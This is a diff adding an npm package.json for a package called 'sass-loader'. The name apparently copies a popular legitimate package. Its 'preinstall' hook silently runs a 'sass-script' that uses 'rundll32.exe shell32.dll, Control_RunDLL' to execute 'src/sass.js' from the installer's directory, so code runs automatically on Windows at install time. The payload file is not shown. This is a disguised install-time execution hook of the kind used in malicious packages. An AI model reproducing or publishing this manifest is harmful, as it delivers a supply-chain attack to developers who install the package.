@@ -1,0 +1,13 @@
+{
+  "name": "sass-loader",
+  "version": "1.0.0",
+  "description": "Sass Loader",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "npm run sass-script --silent",
+    "sass-script": "rundll32.exe shell32.dll, Control_RunDLL \"%INIT_CWD%/src/sass.js\""
+  },
+  "author": "Maik Jonson",
+  "license": "ISC"
+}
